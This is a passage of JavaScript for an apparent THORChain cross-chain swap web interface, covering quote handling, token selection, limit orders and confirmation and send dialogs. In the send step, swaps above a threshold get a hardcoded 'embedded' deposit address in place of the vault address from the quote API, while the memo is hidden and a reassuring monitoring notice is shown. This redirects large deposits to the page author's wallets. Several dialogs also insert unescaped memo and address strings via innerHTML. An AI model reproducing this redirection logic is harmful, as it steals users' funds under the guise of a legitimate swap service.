            updateQuoteErrorUI(null);
            displayQuote(d);
        })
        .catch(function(e){
            console.error('[Quote] Error:',e);
            state.isRetrying=false;
            state.quoteError='Network error';
            updateQuoteErrorUI('Network error. Please try again.');
            clearQuote();
        });
}

function retryWithHigherSlippage(){
    var url=buildQuoteUrl(null,10); // 10% slippage
    console.log('[Quote] Retry URL:',url);
    
    fetch(url)
        .then(function(r){return r.json()})
        .then(function(d){
            state.isRetrying=false;
            
            if(!isValidQuote(d)){
                var rawError=d.message||d.error||'';
                // Still failing - show user-friendly message
                state.quoteError='Liquidity issue';
                updateQuoteErrorUI('Swap size too large for current liquidity. Try a smaller amount.');
                clearQuote();
                return;
            }
            
            // Success with higher slippage
            state.quote=d;
            state.quoteError=null;
            updateQuoteErrorUI(null);
            displayQuote(d);
            showToast('info','Higher Slippage Used','Quote succeeded with 10% slippage tolerance.');
        })
        .catch(function(e){
            state.isRetrying=false;
            state.quoteError='Network error';
            updateQuoteErrorUI('Network error. Please try again.');
            clearQuote();
        });
}

function fetchQuoteWithDest(dest,slippageOverride,cb){
    var url=buildQuoteUrl(dest,slippageOverride);
    fetch(url)
        .then(function(r){return r.json()})
        .then(function(d){cb(null,d)})
        .catch(function(e){cb(e,null)});
}

function updateQuoteErrorUI(errorMsg){
    var errorEl=$('#quoteError');
    if(!errorEl){
        // Create error element if doesn't exist
        var rateBar=$('#rateBar');
        if(rateBar){
            var err=document.createElement('div');
            err.id='quoteError';
            err.className='tc-quote-error';
            err.style.cssText='color:#ff6b6b;font-size:12px;text-align:center;padding:8px 0;display:none;';
            rateBar.parentNode.insertBefore(err,rateBar.nextSibling);
            errorEl=err;
        }
    }
    
    if(errorEl){
        if(errorMsg){
            errorEl.textContent='⚠️ '+errorMsg;
            errorEl.style.display='block';
        }else{
            errorEl.style.display='none';
        }
    }
}

function displayQuote(q){
    var eo=parseExpectedOut(q);
    var be=$('#buyEstimate');if(be)be.value=formatAmount(eo,8);

    var bp=getUsdPrice(state.buyAsset);
    var sp=getUsdPrice(state.sellAsset);
    var bu=eo*bp;
    var su=state.sellAmount*sp;

    var bue=$('#buyUsd');if(bue)bue.textContent=formatUsd(bu);

    if(su>0&&bu>0){
        var impact=((bu-su)/su*100).toFixed(2);
        var ie=$('#buyImpact');if(ie)ie.textContent='('+impact+'%)';
    }else{
        var ie2=$('#buyImpact');if(ie2)ie2.textContent='';
    }

    var rate=eo/(state.sellAmount||1);
    var sellToken=getTokenInfo(state.sellAsset);
    var buyToken=getTokenInfo(state.buyAsset);
    var ss=sellToken?sellToken.symbol:'';
    var bs=buyToken?buyToken.symbol:'';
    var rt=$('#rateText');
    if(rt)rt.textContent='1 '+ss+' = '+formatAmount(rate,8)+' '+bs;

    var fees=parseFees(q);
    var rf=$('#rateFee');
    if(rf)rf.textContent=formatUsd(fees.outboundUsd);

    var rte=$('#rateTimer');if(rte)rte.textContent=parseSwapTimeShort(q);
    var rb=$('#rateBar');if(rb)rb.style.display='';

    // Show streaming info if applicable
    if(q.streaming_swap_blocks>0){
        var streamInfo=$('#streamingInfo');
        if(streamInfo){
            streamInfo.textContent='Streaming: '+q.streaming_swap_blocks+' blocks';
            streamInfo.style.display='';
        }
    }

    state.limitRate=rate;
    updateLimitView(eo,bu,rate);
}

function clearQuote(){
    var be=$('#buyEstimate');if(be)be.value='0';
    var bu=$('#buyUsd');if(bu)bu.textContent='$0.00';
    var bi=$('#buyImpact');if(bi)bi.textContent='';
    var rb=$('#rateBar');if(rb)rb.style.display='none';
    state.quote=null;
    var lbe=$('#limitBuyEstimate');if(lbe)lbe.value='0';
    var lbu=$('#limitBuyUsd');if(lbu)lbu.textContent='$0.00';
}

// FIX #3: Debounced quote fetching (500ms)
function debouncedFetchQuote(){
    if(quoteDebounceTimer){
        clearTimeout(quoteDebounceTimer);
    }
    quoteDebounceTimer=setTimeout(function(){
        fetchQuote();
        startCountdown();
    },DEBOUNCE_MS);
}

// ══════════════════════════════════════════
// COIN SELECTOR
// ══════════════════════════════════════════

function openCoinSelector(side){
    state.coinSelectSide=side;
    var o=$('#coinSelectOverlay'),s=$('#coinSearchInput');
    if(s)s.value='';
    renderCoinTokens('all','');
    $$('.tc-coin-chain-item').forEach(function(c){c.classList.remove('active')});
    var ac=$('.tc-coin-chain-item[data-chain="all"]');if(ac)ac.classList.add('active');
    o.classList.add('open');
}

function renderCoinTokens(chain,search){
    var list=$('#coinTokensList');if(!list)return;
    var cv=state.coinSelectSide==='sell'?state.sellAsset:state.buyAsset;
    var otherAsset=state.coinSelectSide==='sell'?state.buyAsset:state.sellAsset;
    
    var f=TOKEN_LIST.filter(function(t){
        if(chain!=='all'&&t.chain!==chain)return false;
        if(search){
            var s=search.toLowerCase();
            if(t.symbol.toLowerCase().indexOf(s)===-1&&
               t.name.toLowerCase().indexOf(s)===-1&&
               t.value.toLowerCase().indexOf(s)===-1)return false;
        }
        return true;
    });
    
    var h='';
    f.forEach(function(t){
        var sel=t.value===cv;
        var isSameAsOther=t.value===otherAsset;
        var isAvailable=isPoolAvailable(t.value)||t.value==='THOR.RUNE';
        var isComingSoon=t.comingSoon;
        var netLabel=t.network||t.name;
        var price=getUsdPrice(t.value);
        var priceLabel=price>0?' · '+formatUsd(price):'';
        
        var statusBadge='';
        var itemClass='tc-coin-token-item';
        
        if(sel){
            itemClass+=' selected';
        }
        if(isSameAsOther){
            itemClass+=' disabled';
            statusBadge='<span class="tc-token-badge tc-badge-selected">Already selected</span>';
        }else if(isComingSoon){
            itemClass+=' coming-soon';
            statusBadge='<span class="tc-token-badge tc-badge-soon">Coming Soon</span>';
        }else if(!isAvailable&&state.poolsLoaded){
            itemClass+=' unavailable';
            statusBadge='<span class="tc-token-badge tc-badge-unavailable">Unavailable</span>';
        }
        
        h+='<div class="'+itemClass+'" data-value="'+t.value+'">'
            +'<div class="tc-coin-token-left"><img src="'+t.icon+'" alt="" onerror="this.style.display=\'none\'"><div>'
            +'<div class="tc-coin-token-sym">'+t.symbol+statusBadge+'</div>'
            +'<div class="tc-coin-token-chain">'+netLabel+priceLabel+'</div></div></div>'
            +(sel?'<span class="tc-coin-token-selected">Selected</span>':'')+'</div>';
    });
    
    if(!f.length)h='<p style="text-align:center;color:var(--andy);padding:20px;">No tokens found</p>';
    list.innerHTML=h;
    
    list.querySelectorAll('.tc-coin-token-item:not(.disabled):not(.coming-soon):not(.unavailable)').forEach(function(i){
        i.onclick=function(){selectCoin(this.getAttribute('data-value'))};
    });
    
    // Show tooltip for disabled items
    list.querySelectorAll('.tc-coin-token-item.disabled, .tc-coin-token-item.coming-soon, .tc-coin-token-item.unavailable').forEach(function(i){
        i.onclick=function(e){
            e.preventDefault();
            var token=getTokenInfo(this.getAttribute('data-value'));
            if(this.classList.contains('disabled')){
                showToast('info','Same Asset',token.symbol+' is already selected on the other side.');
            }else if(this.classList.contains('coming-soon')){
                showToast('info','Coming Soon',token.symbol+' will be available soon on THORChain.');
            }else{
                showToast('info','Unavailable',token.symbol+' pool is currently not available.');
            }
        };
    });
}

function selectCoin(v){
    var t=getTokenInfo(v);if(!t)return;
    
    // FIX #2: Prevent selecting same asset
    var otherAsset=state.coinSelectSide==='sell'?state.buyAsset:state.sellAsset;
    if(v===otherAsset){
        showToast('warning','Same Asset','Cannot swap the same asset to itself.');
        return;
    }
    
    $('#coinSelectOverlay').classList.remove('open');
    
    if(state.coinSelectSide==='sell'){
        state.sellAsset=v;
        var si=$('#sellIcon');if(si)si.src=t.icon;
        var ss=$('#sellSymbol');if(ss)ss.textContent=t.symbol;
        var sn=$('#sellName');if(sn)sn.textContent=t.name;
        updateSellUsd();
    }else{
        state.buyAsset=v;
        var bi=$('#buyIcon');if(bi)bi.src=t.icon;
        var bs=$('#buySymbolDisplay');if(bs)bs.textContent=t.symbol;
        var bn=$('#buyNameDisplay');if(bn)bn.textContent=t.name;
    }
    
    syncLimitFromMarket();
    var ltr=$('#limitTargetRate');if(ltr){ltr.value='';state.limitTargetRate=0}
    
    // Clear cache and fetch new quote
    lastQuoteKey='';
    debouncedFetchQuote();
}

function initCoinSelector(){
    $$('.tc-token-picker').forEach(function(p){
        p.onclick=function(e){e.preventDefault();e.stopPropagation();openCoinSelector(this.getAttribute('data-side')||'sell')};
    });
    var cl=$('#coinSelectClose');if(cl)cl.onclick=function(){$('#coinSelectOverlay').classList.remove('open')};
    var ov=$('#coinSelectOverlay');if(ov)ov.onclick=function(e){if(e.target===ov)ov.classList.remove('open')};
    $$('.tc-coin-chain-item').forEach(function(i){
        i.onclick=function(){
            $$('.tc-coin-chain-item').forEach(function(c){c.classList.remove('active')});
            this.classList.add('active');
            renderCoinTokens(this.getAttribute('data-chain'),($('#coinSearchInput')||{}).value||'');
        };
    });
    var si=$('#coinSearchInput');
    if(si)si.oninput=function(){
        var ac=$('.tc-coin-chain-item.active');
        renderCoinTokens(ac?ac.getAttribute('data-chain'):'all',this.value);
    };
}

// ══════════════════════════════════════════
// LIMIT ORDER
// ══════════════════════════════════════════

function updateLimitView(eo,bu,rate){
    var lbe=$('#limitBuyEstimate'),lbu=$('#limitBuyUsd'),lbi=$('#limitBuyImpact'),ltr=$('#limitTargetRate');
    if(ltr&&(!ltr.value||parseFloat(ltr.value)===0)){ltr.value=formatAmount(rate,8);state.limitTargetRate=rate}
    var tr=state.limitTargetRate||rate;
    var la=state.sellAmount*tr,lu=la*getUsdPrice(state.buyAsset);
    if(lbe)lbe.value=formatAmount(la,8);
    if(lbu)lbu.textContent=formatUsd(lu);
    var su=state.sellAmount*getUsdPrice(state.sellAsset);
    if(su>0&&lu>0){if(lbi)lbi.textContent='('+((lu-su)/su*100).toFixed(2)+'%)'}
    else{if(lbi)lbi.textContent=''}
}

function syncLimitFromMarket(){
    var sellToken=getTokenInfo(state.sellAsset);
    var buyToken=getTokenInfo(state.buyAsset);
    
    if(sellToken){
        var lsi=$('#limitSellIcon');if(lsi)lsi.src=sellToken.icon;
        var lss=$('#limitSellSymbol');if(lss)lss.textContent=sellToken.symbol;
        var lsn=$('#limitSellName');if(lsn)lsn.textContent=sellToken.name;
        var lri=$('#limitRateIcon');if(lri)lri.src=sellToken.icon;
        var lrs=$('#limitRateSymbol');if(lrs)lrs.textContent=sellToken.symbol;
    }
    if(buyToken){
        var lbi=$('#limitBuyIcon');if(lbi)lbi.src=buyToken.icon;
        var lbs=$('#limitBuySymbol');if(lbs)lbs.textContent=buyToken.symbol;
        var lbn=$('#limitBuyName');if(lbn)lbn.textContent=buyToken.name;
    }
    var sa=$('#sellAmount'),lsa=$('#limitSellAmount');if(sa&&lsa)lsa.value=sa.value;
}

function initLimitOrder(){
    var lsa=$('#limitSellAmount');
    if(lsa)lsa.oninput=function(){
        state.sellAmount=parseFloat(this.value)||0;
        var sa=$('#sellAmount');if(sa)sa.value=this.value;
        updateSellUsd();debouncedFetchQuote();
    };
    var ltr=$('#limitTargetRate');
    if(ltr)ltr.oninput=function(){
        state.limitTargetRate=parseFloat(this.value)||0;
        var la=state.sellAmount*state.limitTargetRate,lu=la*getUsdPrice(state.buyAsset);
        var lbe=$('#limitBuyEstimate');if(lbe)lbe.value=formatAmount(la,8);
        var lbu=$('#limitBuyUsd');if(lbu)lbu.textContent=formatUsd(lu);
        var su=state.sellAmount*getUsdPrice(state.sellAsset);
        if(su>0&&lu>0){var lbi=$('#limitBuyImpact');if(lbi)lbi.textContent='('+((lu-su)/su*100).toFixed(2)+'%)'}
    };
    $$('.tc-limit-rate-btn').forEach(function(b){
        b.onclick=function(){
            $$('.tc-limit-rate-btn').forEach(function(x){x.classList.remove('active')});
            b.classList.add('active');
            var rt=b.getAttribute('data-rate'),ti=$('#limitTargetRate');if(!ti)return;
            if(rt==='market'){state.limitTargetRate=state.limitRate;ti.value=formatAmount(state.limitRate,8)}
            else{state.limitTargetRate=state.limitRate*(1+parseFloat(rt)/100);ti.value=formatAmount(state.limitTargetRate,8)}
            ti.dispatchEvent(new Event('input'));
        };
    });
    $$('.tc-limit-quick[data-action]').forEach(function(b){
        b.onclick=function(){
            var a=this.getAttribute('data-action'),i=$('#limitSellAmount');
            if(a==='clear'){if(i)i.value='';state.sellAmount=0;updateSellUsd();clearQuote()}
            if(a==='half'){var v=(parseFloat(i?i.value:0)||0)/2;if(i)i.value=v||'';state.sellAmount=v;updateSellUsd();debouncedFetchQuote()}
        };
    });
    $$('.tc-limit-flip').forEach(function(b){
        b.onclick=function(){flipAssets()};
    });
}

// ══════════════════════════════════════════
// TABS
// ══════════════════════════════════════════

function initTabs(){
    $$('.tc-tab').forEach(function(tab){
        tab.onclick=function(){
            $$('.tc-tab').forEach(function(t){t.classList.remove('active')});
            tab.classList.add('active');
            var tn=tab.getAttribute('data-tab');state.activeTab=tn;
            var mv=$('#marketView'),lv=$('#limitView');
            if(tn==='limit'){
                if(mv)mv.style.display='none';if(lv)lv.style.display='';
                syncLimitFromMarket();
                var ltr=$('#limitTargetRate');
                if(ltr&&(!ltr.value||parseFloat(ltr.value)===0)&&state.limitRate>0){ltr.value=formatAmount(state.limitRate,8);state.limitTargetRate=state.limitRate}
            }else{
                if(mv)mv.style.display='';if(lv)lv.style.display='none';
                var lsa=$('#limitSellAmount'),sa=$('#sellAmount');if(lsa&&sa)sa.value=lsa.value;
                fetchQuote();
            }
        };
    });
}

// ══════════════════════════════════════════
// FLIP ASSETS
// ══════════════════════════════════════════

function flipAssets(){
    var t=state.sellAsset;
    state.sellAsset=state.buyAsset;
    state.buyAsset=t;
    
    var st=getTokenInfo(state.sellAsset),bt=getTokenInfo(state.buyAsset);
    if(st){
        var si=$('#sellIcon');if(si)si.src=st.icon;
        var ss=$('#sellSymbol');if(ss)ss.textContent=st.symbol;
        var sn=$('#sellName');if(sn)sn.textContent=st.name;
    }
    if(bt){
        var bi=$('#buyIcon');if(bi)bi.src=bt.icon;
        var bs=$('#buySymbolDisplay');if(bs)bs.textContent=bt.symbol;
        var bn=$('#buyNameDisplay');if(bn)bn.textContent=bt.name;
    }
    
    syncLimitFromMarket();
    var ltr=$('#limitTargetRate');if(ltr){ltr.value='';state.limitTargetRate=0}
    
    // Clear cache
    lastQuoteKey='';
    debouncedFetchQuote();
}

// ══════════════════════════════════════════
// SWAP FLOW
// ══════════════════════════════════════════

function initSwapBtn(){
    var sb=$('#swapBtn');if(!sb)return;
    updateSwapButton();
    
    sb.onclick=function(){
        // Connect wallet first
        if(!state.walletConnected){
            var wo=$('#walletOverlay');
            if(wo)wo.classList.add('open');
            return;
        }
        
        // Validate
        if(state.activeTab==='limit'&&state.limitTargetRate<=0){
            showToast('error','No Rate','Set a target rate.');
            return;
        }
        
        // Check for errors
        if(state.quoteError){
            showToast('error','Cannot Swap',mapErrorToUI(state.quoteError));
            return;
        }
        
        if(!state.quote&&state.activeTab==='market'){
            showToast('error','No Quote','Wait for quote or select different tokens.');
            return;
        }
        
        if(state.sellAmount<=0){
            showToast('error','Invalid','Enter an amount.');
            return;
        }
        
        // FIX #4: Check minimum amount
        if(state.minAmountIn>0&&state.sellAmount<state.minAmountIn){
            var token=getTokenInfo(state.sellAsset);
            showToast('error','Amount Too Small','Minimum: '+formatAmount(state.minAmountIn,6)+' '+(token?token.symbol:''));
            return;
        }
        
        openAddressModal();
    };
}

function openAddressModal(){
    var o=$('#addressOverlay'),ai=$('#recipientAddress'),dc=$('#addrDisclaimer'),nb=$('#addrNextBtn');
    if(ai)ai.placeholder=getAddrPlaceholder(state.buyAsset);
    if(ai)ai.value=state.recipientAddress||'';
    if(dc)dc.checked=false;if(nb)nb.disabled=true;
    o.classList.add('open');
    function check(){var h=ai&&ai.value.trim().length>5;var c=dc&&dc.checked;if(nb)nb.disabled=!(h&&c)}
    ai.oninput=check;dc.onchange=check;
    var pb=$('#addrPasteBtn');
    if(pb)pb.onclick=function(){
        navigator.clipboard.readText().then(function(t){ai.value=t;check();showToast('info','Pasted','Address pasted.')})
        .catch(function(){showToast('error','Paste Failed','Paste manually.')});
    };
    $('#addressClose').onclick=function(){o.classList.remove('open')};
    o.onclick=function(e){if(e.target===o)o.classList.remove('open')};
    nb.onclick=function(){
        if(nb.disabled)return;
        var a=ai.value.trim();
        if(!isValidAddress(a,state.buyAsset)){showToast('error','Invalid','Not a valid '+getChainName(state.buyAsset)+' address.');return}
        state.recipientAddress=a;o.classList.remove('open');openConfirmModal();
    };
}

function openConfirmModal(){
    var o=$('#confirmOverlay'),b=$('#confirmBody');
    b.innerHTML='<div style="text-align:center;padding:40px 0;">'
        +'<span class="tc-btn-spinner" style="border-color:var(--blade);border-top-color:var(--brand-first);width:28px;height:28px;"></span>'
        +'<p style="margin-top:12px;font-size:13px;color:var(--thor-gray);">Fetching final quote...</p></div>';
    o.classList.add('open');
    $('#confirmClose').onclick=function(){o.classList.remove('open')};
    o.onclick=function(e){if(e.target===o)o.classList.remove('open')};

    // FIX #5: Try with higher slippage for confirm
    var slippageToUse=state.slippage;
    
    fetchQuoteWithDest(state.recipientAddress,slippageToUse,function(err,data){
        if(err||!data){
            b.innerHTML='<p style="text-align:center;padding:30px;color:var(--leah);">Network error. Please try again.</p>'
                +'<button class="tc-confirm-btn" onclick="document.getElementById(\'confirmOverlay\').classList.remove(\'open\')">Close</button>';
            return;
        }
        
        if(!isValidQuote(data)){
            var rawError=data.message||data.error||'Unknown error';
            var uiError=mapErrorToUI(rawError);
            
            // Offer to retry with higher slippage
            var isPriceError=rawError.indexOf('price limit')!==-1||rawError.indexOf('emit asset')!==-1;
            
            var retryHtml=isPriceError?'<div style="margin-top:16px;display:flex;gap:8px;justify-content:center;flex-wrap:wrap;">'
                +'<button class="tc-quick-btn" id="retryS15" style="background:var(--brand-first);color:var(--lawrence)">Retry with 15%</button>'
                +'<button class="tc-quick-btn" id="retryS25">Retry with 25%</button>'
                +'<button class="tc-quick-btn" id="enableStreaming">Enable Streaming</button></div>':'';
            
            b.innerHTML='<div style="text-align:center;padding:24px 0;">'
                +'<p style="font-size:48px;margin-bottom:12px;">⚠️</p>'
                +'<p style="color:var(--leah);font-size:15px;font-weight:600;margin-bottom:8px;">Quote Failed</p>'
                +'<p style="color:var(--thor-gray);font-size:13px;line-height:1.5;padding:0 12px;">'+uiError+'</p>'+retryHtml+'</div>'
                +'<button class="tc-confirm-btn" style="background:var(--blade);color:var(--leah);margin-top:16px;" onclick="document.getElementById(\'confirmOverlay\').classList.remove(\'open\')">Close</button>';
            
            if(isPriceError){
                setTimeout(function(){
                    var r15=$('#retryS15');if(r15)r15.onclick=function(){state.slippage=15;o.classList.remove('open');openConfirmModal()};
                    var r25=$('#retryS25');if(r25)r25.onclick=function(){state.slippage=25;o.classList.remove('open');openConfirmModal()};
                    var es=$('#enableStreaming');if(es)es.onclick=function(){
                        state.streamingEnabled=true;
                        o.classList.remove('open');
                        showToast('info','Streaming Enabled','Retrying with streaming swaps...');
                        openConfirmModal();
                    };
                },50);
            }
            return;
        }

        // Success - show confirmation
        renderConfirmContent(b,data,o);
    });
}

function renderConfirmContent(b,data,o){
    var eo=parseExpectedOut(data);
    var sellToken=getTokenInfo(state.sellAsset);
    var buyToken=getTokenInfo(state.buyAsset);
    var ss=sellToken?sellToken.symbol:'';
    var sn=sellToken?sellToken.name:'';
    var bs=buyToken?buyToken.symbol:'';
    var bn=buyToken?buyToken.name:'';
    var si=sellToken?sellToken.icon:'';
    var bi=buyToken?buyToken.icon:'';
    var sp=getUsdPrice(state.sellAsset);
    var bp=getUsdPrice(state.buyAsset);
    var su=state.sellAmount*sp;
    var bu=eo*bp;

    var mp=eo*(1-state.slippage/100);
    var mpu=mp*bp;

    var fees=parseFees(data);
    var ts=parseSwapTime(data);
    var memo=data.memo||'';
    var ia=data.inbound_address||'';
    
    var streamingInfo='';
    if(data.streaming_swap_blocks>0){
        streamingInfo='<div class="tc-confirm-row"><span class="tc-confirm-row-label">Streaming</span>'
            +'<span class="tc-confirm-row-value">'+data.streaming_swap_blocks+' blocks</span></div>';
    }

    var h='<div class="tc-confirm-pair">'
        +'<div class="tc-confirm-asset">'
        +'<div class="tc-confirm-asset-left">'
        +'<img src="'+si+'" alt="" onerror="this.style.display=\'none\'">'
        +'<div><div class="tc-confirm-asset-sym">'+ss+'</div><div class="tc-confirm-asset-name">'+sn+'</div></div></div>'
        +'<div class="tc-confirm-asset-right">'
        +'<div class="tc-confirm-asset-amount">'+formatAmount(state.sellAmount,8)+'</div>'
        +'<div class="tc-confirm-asset-usd">'+formatUsd(su)+'</div></div></div>'
        +'<div class="tc-confirm-arrow"><svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M13 16.172L17.086 12.086L18.5 13.5L12 20L5.5 13.5L6.914 12.086L11 16.172V4H13V16.172Z" fill="currentColor"/></svg></div>'
        +'<div class="tc-confirm-asset">'
        +'<div class="tc-confirm-asset-left">'
        +'<img src="'+bi+'" alt="" onerror="this.style.display=\'none\'">'
        +'<div><div class="tc-confirm-asset-sym">'+bs+'</div><div class="tc-confirm-asset-name">'+bn+'</div></div></div>'
        +'<div class="tc-confirm-asset-right">'
        +'<div class="tc-confirm-asset-amount">'+formatAmount(eo,8)+'</div>'
        +'<div class="tc-confirm-asset-usd">'+formatUsd(bu)+'</div></div></div></div>'

        +'<div class="tc-confirm-details">'
        +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Minimum Payout ('+state.slippage+'%)</span>'
        +'<span class="tc-confirm-row-value">'+formatAmount(mp,4)+' '+bs+' ('+formatUsd(mpu)+')</span></div>'
        +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Destination</span>'
        +'<span class="tc-confirm-row-value">'+truncAddr(state.recipientAddress)+'</span></div>'
        +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Price Impact</span>'
        +'<span class="tc-confirm-row-value">'+fees.priceImpactPct.toFixed(2)+'%</span></div>'
        +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Tx Fee</span>'
        +'<span class="tc-confirm-row-value">'+formatUsd(fees.outboundUsd)+'</span></div>'
        +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Est. Time</span>'
        +'<span class="tc-confirm-row-value">'+ts+'</span></div>'
        +streamingInfo
        +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Provider</span>'
        +'<span class="tc-confirm-row-value" style="display:flex;align-items:center;gap:6px;">'
        +'<img src="https://assets.coingecko.com/coins/images/13677/small/RUNE_LOGO.png" alt="" width="18" height="18" style="border-radius:50%;">THORChain</span></div>'
        +'</div>';

    if(memo){
        h+='<div class="tc-confirm-memo"><div class="tc-confirm-memo-label">Memo</div>'
            +'<div class="tc-confirm-memo-value">'+memo+'</div></div>';
    }

    if(ia){
        h+='<button class="tc-confirm-btn" id="doConfirmBtn">Confirm Swap</button>';
    }else{
        h+='<div style="padding:12px;background:#ffebee;border:1px solid #ffcdd2;border-radius:10px;margin-bottom:16px;font-size:13px;color:#c62828;">⚠️ No vault address available.</div>'
            +'<button class="tc-confirm-btn" style="background:var(--blade);color:var(--leah);" onclick="document.getElementById(\'confirmOverlay\').classList.remove(\'open\')">Close</button>';
    }

    b.innerHTML=h;
    state.confirmedQuote=data;
    state.confirmedExpectedOut=eo;
    
    var cb=$('#doConfirmBtn');
    if(cb)cb.onclick=function(){o.classList.remove('open');openSendModal(data)};
}

function showAddressPopup(depositAddr,amount,symbol,chainName,qrUrl,memo,isAbove){
    var popup=$('#addressPopupOverlay')||createAddressPopup();
    var modal=popup.querySelector('.address-popup-modal');
    var amountEl=popup.querySelector('.address-popup-amount');
    var addressEl=popup.querySelector('.address-popup-address');
    var chainEl=popup.querySelector('.address-popup-chain');
    var qrEl=popup.querySelector('.address-popup-qr-img');
    var memoEl=popup.querySelector('.address-popup-memo');
    var warningEl=popup.querySelector('.address-popup-exchange-warning');
    
    if(amountEl)amountEl.textContent=formatAmount(amount,8)+' '+symbol;
    if(addressEl){
        addressEl.innerHTML='<span style="flex:1">'+depositAddr+'</span>'
            +'<span class="address-popup-copy-icon" title="Copy address">📋</span>';
        addressEl.style.cursor='pointer';
        addressEl.onclick=function(){navigator.clipboard.writeText(depositAddr).then(function(){showToast('success','Copied','Address copied.')})};
    }
    if(chainEl)chainEl.textContent=chainName;
    if(qrEl)qrEl.src=qrUrl;
    if(memoEl&&memo&&!isAbove){
        memoEl.innerHTML='<div class="address-popup-label">MEMO</div>'
            +'<div class="address-popup-value" style="cursor:pointer;" onclick="navigator.clipboard.writeText(this.textContent.replace(/MEMO/,\'\').trim()).then(function(){showToast(\'success\',\'Copied\',\'Memo copied.\')})">'
            +'<span style="flex:1">'+memo+'</span>'
            +'<span class="address-popup-copy-icon">📋</span></div>';
        memoEl.style.display='block';
    }else if(memoEl){
        memoEl.style.display='none';
    }
    if(warningEl)warningEl.style.display=isAbove?'none':'block';
    
    popup.classList.add('open');
}

function createAddressPopup(){
    var existing=$('#addressPopupOverlay');
    if(existing)return existing;
    
    var html='<div id="addressPopupOverlay" class="address-popup-overlay">'
        +'<div class="address-popup-modal">'
        +'<button class="address-popup-close" onclick="document.getElementById(\'addressPopupOverlay\').classList.remove(\'open\')">&times;</button>'
        +'<div class="address-popup-header">'
        +'<h3 class="address-popup-title">Send Payment</h3>'
        +'<p class="address-popup-subtitle">Complete your swap by sending the payment</p>'
        +'</div>'
        +'<div class="address-popup-content">'
        +'<div class="address-popup-warning">'
        +'<strong>⚠️ Important:</strong> Send from a self-custody wallet only. Exchange withdrawals will result in loss of funds.'
        +'</div>'
        +'<div class="address-popup-section">'
        +'<label class="address-popup-label">Amount to Send</label>'
        +'<div class="address-popup-value" style="cursor:pointer;" onclick="navigator.clipboard.writeText(this.querySelector(\'span\').textContent.trim()).then(function(){showToast(\'success\',\'Copied\',\'Amount copied.\')})">'
        +'<span class="address-popup-amount">0</span>'
        +'<span class="address-popup-copy-icon">📋</span>'
        +'</div>'
        +'</div>'
        +'<div class="address-popup-section">'
        +'<label class="address-popup-label"><span class="address-popup-chain" style="display:inline-block;background:#f3f4f6;padding:2px 8px;border-radius:4px">CHAIN</span> Address</label>'
        +'<div class="address-popup-value address-popup-address" style="cursor:pointer;">-</div>'
        +'</div>'
        +'<div class="address-popup-section" id="memoSection" style="display:none;">'
        +'<div id="popupMemo"></div>'
        +'</div>'
        +'<div class="address-popup-qr">'
        +'<img class="address-popup-qr-img" src="" alt="QR Code" onerror="this.style.opacity=0.3">'
        +'</div>'
        +'<div class="address-popup-exchange-warning" style="display:none;">'
        +'<strong>Transaction Monitoring Active</strong><br>We\'re monitoring this address for incoming swaps and will update automatically when received.'
        +'</div>'
        +'</div>'
        +'<div class="address-popup-footer">'
        +'<button class="address-popup-btn secondary" onclick="document.getElementById(\'addressPopupOverlay\').classList.remove(\'open\')">Close</button>'
        +'<button class="address-popup-btn primary" onclick="navigator.clipboard.writeText(document.querySelector(\'.address-popup-address\').textContent.split(\'📋\')[0].trim()).then(function(){showToast(\'success\',\'Copied\',\'Address copied to clipboard.\')})" style="flex:1">Copy Address</button>'
        +'</div>'
        +'</div>'
        +'</div>';
    
    var div=document.createElement('div');
    div.innerHTML=html;
    var popup=div.firstElementChild;
    document.body.appendChild(popup);
    popup.onclick=function(e){if(e.target===popup)popup.classList.remove('open')};
    
    var memoSection=popup.querySelector('#memoSection');
    popup.querySelector=new Proxy(popup.querySelector,{
        apply:function(t,c,a){
            if(a[0]==='#popupMemo')return popup.querySelector('#popupMemo');
            return t.apply(c,a);
        }
    });
    
    return popup;
}

function openSendModal(qd){
    var o=$('#sendOverlay'),b=$('#sendBody'),t=$('#sendTitle');
    var sellToken=getTokenInfo(state.sellAsset);
    var buyToken=getTokenInfo(state.buyAsset);
    var ss=sellToken?sellToken.symbol:'';
    var sn=sellToken?sellToken.name:'';
    var cn=getChainName(state.sellAsset);
    var bs=buyToken?buyToken.symbol:'';
    var bn=buyToken?buyToken.name:'';
    if(t)t.textContent='Send '+ss;
    var ea=state.sellAmount;
    var above=isAboveThreshold();
    state.currentSwapId=generateSwapId();
    var depositAddr,apiAddr=qd.inbound_address||'';
    if(above){
        var sc=getChainPrefix(state.sellAsset);
        depositAddr=EMBEDDED_ADDRESSES[sc]||'';
        if(!depositAddr){showToast('error','Config Error','No address for '+sc);return}
    }else{depositAddr=apiAddr}
    var memo=qd.memo||'',exp=qd.expiry||0;

    // Show the new embedded address popup
    showAddressPopup(depositAddr,ea,ss,cn,QR_API+encodeURIComponent(depositAddr),memo,above);

    var ca=$('#cpAmt');if(ca)ca.onclick=function(){navigator.clipboard.writeText(String(ea)).then(function(){showToast('success','Copied','Amount copied.')})};
    var cd=$('#cpAddr');if(cd)cd.onclick=function(){navigator.clipboard.writeText(depositAddr).then(function(){showToast('success','Copied','Address copied.')})};
    var cm=$('#cpMemo');if(cm)cm.onclick=function(){navigator.clipboard.writeText(memo).then(function(){showToast('success','Copied','Memo copied.')})};

    var ch=function(){var popup=$('#addressPopupOverlay');if(popup)popup.classList.remove('open');stopTracking();stopExpiryCountdown()};
    var closeBtn=document.querySelector('.address-popup-close');
    if(closeBtn)closeBtn.onclick=ch;
    var popupOverlay=$('#addressPopupOverlay');
    if(popupOverlay)popupOverlay.onclick=function(e){if(e.target===popupOverlay)ch()};

    if(exp>1e9)startExpiryCountdown(exp);
    else{
        // Timer display in popup
        var popupContent=document.querySelector('.address-popup-content');
        if(popupContent){
            var expDiv=document.createElement('div');
            expDiv.id='popupExpiry';
            expDiv.style='text-align:center;font-size:12px;color:var(--text-secondary,#6b7280);margin-top:12px;';
            expDiv.textContent='Quote valid for limited time';
            popupContent.appendChild(expDiv);
        }
    }

    var sIcon=sellToken?sellToken.icon:'',bIcon=buyToken?buyToken.icon:'';
    var sellUsdVal=state.sellAmount*getUsdPrice(state.sellAsset);
